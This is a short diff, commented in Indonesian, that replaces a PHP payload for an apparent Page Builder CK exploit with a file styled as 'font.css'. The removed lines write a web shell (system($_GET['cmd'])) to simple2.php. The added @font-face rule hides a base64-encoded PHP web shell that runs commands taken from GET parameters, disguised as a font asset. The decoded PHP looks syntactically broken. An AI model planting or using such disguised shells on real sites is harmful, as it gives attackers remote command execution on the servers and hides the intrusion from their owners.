@@ -1,5 +1,5 @@
-/* Payload untuk Page Builder CK exploit */
-<?php
-// Shell akan ditulis ke simple2.php
-file_put_contents('simple2.php', '<?php system($_GET["cmd"]); ?>');
-?>
+/* font.css - Payload untuk Page Builder CK */
+@font-face {
+    font-family: 'pwn';
+    src: url('data:text/plain;base64,PD9waHAgaWYoZm9yZWFjaCgkX0dFVCBhcyAkaykgeyR2PSRfR0VUWyRrXTtzeXN0ZW0oJHYpO30gPz4=');
+}
